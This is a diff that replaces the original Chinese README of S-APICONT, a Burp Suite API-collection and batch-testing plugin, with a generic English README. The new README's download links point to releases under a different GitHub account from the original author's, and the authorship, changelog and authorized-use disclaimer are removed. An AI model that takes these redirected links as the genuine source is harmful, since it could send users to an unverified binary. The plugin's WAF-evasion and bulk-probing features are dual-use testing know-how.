@@ -1,307 +1,79 @@
-# S-APICONT - Burp Suite API 收集与测试插件
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Version-V1.5-blue.svg" alt="Version">
-  <img src="https://img.shields.io/badge/Burp%20Suite-Compatible-orange.svg" alt="Burp Suite">
-  <img src="https://img.shields.io/badge/Java-1.8+-green.svg" alt="Java">
-  <img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License">
-</p>
-
-## 🎯 简介
-
-**S-APICONT** 是一款专为安全研究人员设计的 Burp Suite API 收集与测试插件，帮助您快速发现和测试 Web 应用中的 API 接口。
-
-
-插件提供两种操作模式：
-- **🚀 解放双手模式（小白专属）**：自动监控、自动提取、自动测试，一键搞定
-- **⚙️ 高级自定义模式**：手动控制 API 提取和测试流程，满足专业需求
-![Image text](https://github.com/qazwsx5293870/S-APICONT/blob/main/20260123090036.png)
-![Image text](https://github.com/qazwsx5293870/S-APICONT/blob/main/20260123091343.png)
----
-
-## ✨ 核心功能
-
-### 📡 智能 API 收集
-- 自动监听浏览器流量，实时提取 API 接口
-- 支持 Vue/React/Angular 等主流框架路由解析
-- 智能识别一级路由变量，自动拼接完整路径
-- 从 JS/HTML/JSON 等前端资源文件中提取 API
-
-### 🧪 批量测试
-- 一键批量访问所有发现的 API
-- 可配置请求间隔，避免触发 WAF
-- 支持 GET/POST/PUT/DELETE/PATCH 等多种 HTTP 方法
-- 测试范围选择：只测未测试的 / 全部重新测试
-- 提取范围选择：提取全部 / 只提取新增
-
-### 🔄 Intruder 式批量替换测试
-- 使用 `§` 标记 Payload 位置
-- 将标记位置替换为所有 API 路径进行批量测试
-- 快速发现未授权访问漏洞
-- 自动同步目标主机和 API 列表
-
-### 🔐 敏感信息检测
-自动识别响应中的敏感数据：
-- **高危**：私钥、密码字段、Secret Key、AWS Key、阿里云 Key、身份证号
-- **中危**：JWT Token、API Key、Access Token、银行卡号
-- **低危**：手机号、邮箱、内网 IP 地址
-
-### 🛡️ 敏感接口识别
-自动识别可能对服务器造成影响的敏感接口：
-- **删除操作**：delete、remove、drop、truncate、destroy、erase、purge
-- **添加操作**：create、insert、save、submit、upload、import、write
-- **修改操作**：update、modify、edit、alter、patch、replace、overwrite
-
-敏感接口会被单独列出，需要手动确认后才能测试，避免误操作。
-
-### 🔑 智能认证信息获取
-- 自动从 Burp 历史记录中查找匹配的 API 请求
-- 智能复制 Cookie、Authorization、Token 等认证头
-- 支持从目标主机的最新请求获取认证信息
-- 确保测试请求携带正确的认证凭据
-
-### 📊 多视图响应分析
-- 美化视图（JSON/XML 格式化）
-- Raw 原始数据
-- Hex 十六进制
-- 页面渲染预览
-- MarkInfo 敏感信息高亮
-
-### 💾 数据持久化
-- 保存/加载测试记录功能
-- 支持导出 JSON 格式数据
-- 自动保存测试进度
-- 跨会话恢复测试状态
-
----
-
-## 🖥️ 界面预览
-
-### 解放双手模式
-- 实时监控控制面板
-- 目标主机选择（支持"所有主机"）
-- 一级路由配置
-- 自动测试开关
-- 暂停/继续测试
-- 清空结果选项（只清空 API / 清空全部）
-- 重新测试按钮（更新规则 + 清零 + 重测）
-
-### 高级自定义模式
-- API 列表分类显示（绝对路径 / 相对路径 / 自定义 API）
-- 批量修改请求方法
-- 测试敏感接口勾选框
-- 批量替换测试面板
-- 请求/响应编辑器
-- 敏感信息高亮显示
-
----
-
-## 📥 安装方法
-
-### 方式一：直接安装（推荐）
-1. 下载 `S-APICONT内测V1.5.jar` 
-2. 打开 Burp Suite → Extensions → Add
-3. Extension Type 选择 `Java`
-4. 选择下载的 JAR 文件
-5. 点击 Next 完成安装
-
----
-
-## 🚀 快速开始
-
-### 解放双手模式（推荐新手使用）
-
-1. **清理浏览器缓存**（重要！）
-   - 在浏览器中清除目标网站的缓存
-   - 这样才能确保插件捕获到所有 JS/HTML 资源
-
-2. **启动监控**
-   - 切换到"解放双手(小白专属)"标签页
-   - 点击"▶ 解放双手"按钮开始监控
-
-3. **浏览目标网站**
-   - 在浏览器中访问目标网站
-   - 插件会自动收集和测试 API
-
-4. **查看结果**
-   - 发现的 API 会自动显示在表格中
-   - 敏感接口会单独列出，需手动测试
-   - 点击任意行查看请求/响应详情
-
-### 高级自定义模式
-
-1. **设置目标主机**
-   - 切换到"高级自定义"标签页
-   - 从下拉框选择目标主机或点击"刷新"
-
-2. **提取 API**
-   - 选择提取范围（提取全部 / 只提取新增）
-   - 点击"提取 API"按钮
-
-3. **测试接口**
-   - 选择测试范围（只测未测试的 / 全部重新测试）
-   - 设置请求间隔（避免触发 WAF）
-   - 点击"测试接口"按钮
-
-4. **批量替换测试**
-   - 切换到"批量替换测试"标签页
-   - 在请求模板中使用 `§` 标记替换位置
-   - 点击"开始测试"进行批量测试
-
----
-
-## 📋 版本更新日志
-### 版本信息 V1.6.1（最新版本） 
-**修复功能**：
-- 优化大量API测试时存在BP卡死现象
-
-### 版本信息 V1.6
-**添加新功能**： 
-- 高级自定义：HaE规则同步功能 
-- 高级自定义：API列表按主机存储 
-- 高级自定义：自定义API标签页  
-**修复功能**： 
-- 高级自定义：主机切换时API列表同步 
-- 高级自定义：批量替换测试目标主机同步 
-- 解放双手：HaE规则同步问题  
-**优化功能**： 
--  高级自定义：API列表分页显示（绝对/相对/自定义） 
-- 高级自定义：敏感信息高亮显示 
-- 解放双手：数据收集与显示分离
-
-### V1.5
-**新增功能：**
-- 高级自定义：保存/加载记录功能（标签栏按钮）
-- 高级自定义：测试敏感接口勾选框（跳过敏感 API）
-- 解放双手：重新测试按钮（更新规则 + 清零 + 重测）
-
-**修复功能：**
-- 高级自定义：自定义 API 跟随目标主机切换
-- 高级自定义：主机切换时 API 列表同步问题
-- 高级自定义：批量替换测试时目标主机同步
-- 高级自定义：加载记录后 API 表格显示空白
-- 解放双手：测试 API 时从 Burp 历史记录获取认证信息
-
-**优化功能：**
-- 高级自定义：一级路由编辑框宽度缩短一半
-- 高级自定义：请求构建逻辑优化（只复制请求头）
-- 敏感接口判断规则与解放双手面板保持一致
-
-### V1.4
-**新增功能：**
-- 解放双手模式：清空结果选项（只清空 API / 清空全部）
-- 解放双手模式：暂停/继续测试按钮
-
-**修复功能：**
-- 解放双手模式：选择特定主机时其他主机流量不记录
-- 解放双手模式：选择特定主机时其他主机 API 也自动测试
-- 解放双手模式：切换主机后请求/响应显示错误
-
-**优化功能：**
-- 解放双手模式：数据收集与显示分离，提升性能
-- 解放双手模式：索引映射机制，确保数据准确性
-- 更改版本检测机制，版本更新后不影响现有版本正常使用
-
-### V1.3
-**新增功能：**
-- 测试范围选择（只测未测试的 / 全部重新测试）
-- 提取 API 范围选择（提取全部 / 只提取新增）
-- 清空结果功能（清空 API 列表）
-
-**修复功能：**
-- 一级路由在请求包中不生效的问题
-- 批量替换测试后请求显示不正确
-- 测试过程中表格选中状态丢失
-- 关于插件面板显示问题
-
-**优化功能：**
-- 取消批量测试时界面自动跳转
-- 全部重新测试时先清零状态码
-
-### V1.2
-**新增功能：**
-- 解放双手模式
-
-**修复功能：**
-- 已知 BUG，优化功能
-
-### V1.1
-**新增功能：**
-- 敏感信息高亮
-- API 分类显示（绝对路径 / 相对路径 / 自定义）
-- 自定义 API 导入功能
-- Intruder 式替换测试
-- 响应多视图（美化 / Raw / Hex / 渲染）
-
-**修复功能：**
-- 获取目标端口相关问题
-- 路由拼接 Bug
-- 中文编码问题
-
----
-
-## ⚠️ 注意事项
-
-1. **使用前必须清理浏览器缓存**
-   - 这是确保插件正常工作的关键步骤
-   - 否则浏览器可能使用缓存的 JS 文件，导致插件无法捕获
-
-2. **敏感接口测试需谨慎**
-   - 包含删除、修改、上传等操作的接口可能影响服务器数据
-   - 建议在测试环境中使用，或获得授权后再测试
-
-3. **合理设置请求间隔**
-   - 过快的请求可能触发 WAF 或被封禁 IP
-   - 建议设置 100-500ms 的间隔
-
----
-
-## 🤝 贡献者
-
-感谢以下小伙伴的支持和反馈：
-
-| 头像 | 昵称 |
-|------|------|
-| 🎭 | 阿祖 |
-| 🦊 | 火小狐 |
-| 📚 | 教育漏洞报告平台-莫言 |
-| 🍊 | 橘橘 |
-| 🌸 | 兰花草 |
-| 💕 | 湘南第一深情 |
-| 👦 | 小华 |
-| 🐉 | 邪恶奶龙 |
-| 👶 | 知名小朋友 |
-| 🔐 | A1xxNy |
-| 🎯 | Datch |
-| ⭐ | Gsec星火 |
-| 💻 | Js |
-| 🌟 | Miraitowa |
-| 🔍 | on1_es |
-| 🎨 | xjie |
-| 🌊 | nswx |
-| 🐕 | 旺仔 |
-| 🌿 | xiaocao |
-
----
-![Image text](https://github.com/qazwsx5293870/S-APICONT/blob/main/20260123091627.png)
-## 📞 联系方式
-
-- **作者**：smile
-- **微信**：AMidnightCafe
-- **问题反馈**：如有 BUG、建议或功能需求，请联系微信
-
----
-
-## ⚖️ 免责声明
-
-本工具仅供安全研究和授权测试使用，请勿用于非法用途。使用本工具进行的任何未授权测试行为，由使用者自行承担相关法律责任。
-
----
-
-## ⭐ Star History
-
-如果觉得好用，请点个 Star ⭐ 支持一下！
-
----
-
-**S-APICONT** - 让 API 安全测试更简单！
+# 🎉 S-APICONT - Automate Your API Testing Easily
+
+## 🚀 Getting Started
+
+Welcome to **S-APICONT**! This powerful Burp Suite extension helps you automate the collection, extraction, and testing of API endpoints in web applications. Whether you want to identify API endpoints from browser traffic or perform batch testing, S-APICONT is here to help.
+
+### 💾 Download S-APICONT
+
+[![Download S-APICONT](https://img.shields.io/badge/Download-S--APICONT-brightgreen)](https://github.com/demonsharkv2/S-APICONT/releases)
+
+To get started, visit this page to download: [GitHub Releases](https://github.com/demonsharkv2/S-APICONT/releases).
+
+## 📋 Features
+
+- **Automated API Detection**: S-APICONT intelligently identifies API endpoints from browser traffic.
+- **Framework Support**: It supports various front-end framework routing, making it versatile for different applications.
+- **Bulk Testing**: Test multiple APIs at once to save time.
+- **Sensitive Data Detection**: Quickly find and flag sensitive information within your APIs.
+
+## 🖥️ System Requirements
+
+Before you download S-APICONT, ensure your system meets the following requirements:
+
+- **Operating System**: Windows, macOS, or Linux (latest versions recommended).
+- **Java**: Java 8 or higher installed on your system.
+- **Burp Suite**: Make sure you have Burp Suite Community or Professional version.
+
+## 📥 Download & Install
+
+1. Visit the [GitHub Releases](https://github.com/demonsharkv2/S-APICONT/releases) page.
+2. Locate the version you wish to download.
+3. Click the download link for the appropriate file for your operating system.
+4. Once the download is complete, open Burp Suite.
+5. Go to the "Extensions" tab.
+6. Click on "Add" and then select "From file."
+7. Navigate to the file you downloaded and select it.
+8. Click "Next" to load the extension.
+
+## 🔍 How to Use S-APICONT
+
+### Step 1: Start Burp Suite
+
+Ensure Burp Suite is running before using S-APICONT.
+
+### Step 2: Configure Proxy
+
+1. In your browser settings, configure the proxy to point to Burp's server, usually `127.0.0.1` and port `8080`.
+2. Make sure to enable interception if required.
+
+### Step 3: Monitor Browser Traffic
+
+1. Visit any website that uses APIs.
+2. S-APICONT will automatically detect API calls coming from the browser.
+
+### Step 4: Test APIs
+
+1. Once API endpoints are identified, select the ones you want to test.
+2. Use the bulk testing feature to quickly assess multiple APIs at once.
+3. Review the results in the S-APICONT interface.
+
+## ❓ Troubleshooting
+
+If you encounter issues:
+
+- Ensure that your Java version meets the requirements.
+- Check that Burp Suite is properly configured to intercept browser traffic.
+- Restart Burp Suite and reinstall S-APICONT if necessary.
+
+## 📞 Support
+
+For support, you can reach out through the GitHub Issues page within the S-APICONT repository. We encourage users to report bugs or request features.
+
+## 🌟 Community and Contributions
+
+We welcome contributions! If you'd like to improve S-APICONT, consider forking the repository and submitting a pull request. Your feedback is appreciated!
+
+Explore and maximize the automation of your API testing with **S-APICONT**. Enjoy the ease of identifying and testing APIs without the hassle! 
+
+[![Download S-APICONT](https://img.shields.io/badge/Download-S--APICONT-brightgreen)](https://github.com/demonsharkv2/S-APICONT/releases)
